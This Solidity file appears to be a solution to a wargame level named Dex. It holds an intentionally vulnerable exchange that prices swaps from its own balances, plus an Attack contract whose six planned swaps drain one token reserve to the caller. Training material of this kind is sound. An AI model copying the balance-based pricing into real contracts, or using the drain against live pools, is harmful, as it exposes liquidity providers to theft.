// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Dex is Ownable {
  address public token1; // 100 contract | 10 player
  address public token2; // 100 contract | 10 player
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint fromAmount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= fromAmount, "Not enough to swap");
    uint toAmount = getSwapPrice(from, to, fromAmount);
    IERC20(from).transferFrom(msg.sender, address(this), fromAmount);
    IERC20(to).approve(address(this), toAmount);
    IERC20(to).transferFrom(address(this), msg.sender, toAmount);
  }

  // xy = k
  // amountA = amountB * (reserveA / reserveB)
  // amountB = amountA * (reserveB / reserveA)
  // ===
  // Initial: A: 10, B: 10, reserveA: 100, reserveB: 100, k: 1,0000
  // = 1. Sell 10 A
  // 10 (amountA) * 100 (reserveB) / 100 (reserveA) = 10 (amountB)
  // A: 0, B: 20, reserveA: 110, reserveB: 90, k = 9,900

  // = 2. Sell 20 B
  // 20 (amountB) * 110 (reserveA) / 90 (reserveB) = 24.44 = 24 (amountA) =>
  // A: 24, B: 0, reserveA: 86, reserveB: 110, k = 9,460

  // = 3. Sell 24 A
  // 24 (amount A) * 110 (reserveB) / 86 (reserveA) = 30.69 = 30 (amountB) =>
  // A: 0, B: 30, reserveA: 110, reserveB: 80, k = 8,800

  // = 4. Sell 30 B
  // 30 (amount B) * 110 (reserveA) / 80 (reserveB) = 41.25 = 41 (amountA) =>
  // A: 41, B: 0, reserveA: 69, reserveB: 110, k = 7,590

  // = 5. Sell 41 A
  // 41 (A) * 110 (rB) / 69 (rA) = 65.36 = 65 (B)
  // A: 0, B: 65, rA: 110, rB: 45, k = 4,950

  // 6. Sell x B
  // x (B) * 110 (rA) / 45 (rB) = 110 (A)
  // x = 110 / (110/45) = 110 * 45 / 110 = 45
  // =>
  // 6. Sell 45 B
  // 45 (B) * 110 (rA) / 45 (rB) = 110 (A)
  // A: 110: B: 20, rA: 0, rB: 90, k = 0

  function getSwapPrice(address from, address to, uint fromAmount) public view returns(uint toAmount){
    return (
        (fromAmount * IERC20(to).balanceOf(address(this)))
        / 
        IERC20(from).balanceOf(address(this))
    );
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
    _mint(msg.sender, initialSupply);
    _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract Attack {
    function attack(Dex dex) external {
        dex.approve(address(dex), 10000);

        address a = dex.token1();
        address b = dex.token2();

        // 1. Sell 10 A
        dex.swap(a, b, 10);
        // 2. Sell 20 B
        dex.swap(b, a, 20);
        // 3. Sell 24 A
        dex.swap(a, b, 24);
        // 4. Sell 30 B
        dex.swap(b, a, 30);
        // 5. Sell 41 A
        dex.swap(a, b, 41);
        // 6. Sell 45 B
        dex.swap(b, a, 45);

        IERC20 tokenA = IERC20(a);
        tokenA.transfer(msg.sender, tokenA.balanceOf(address(this)));
        IERC20 tokenB = IERC20(b);
        tokenB.transfer(msg.sender, tokenB.balanceOf(address(this)));
    }
}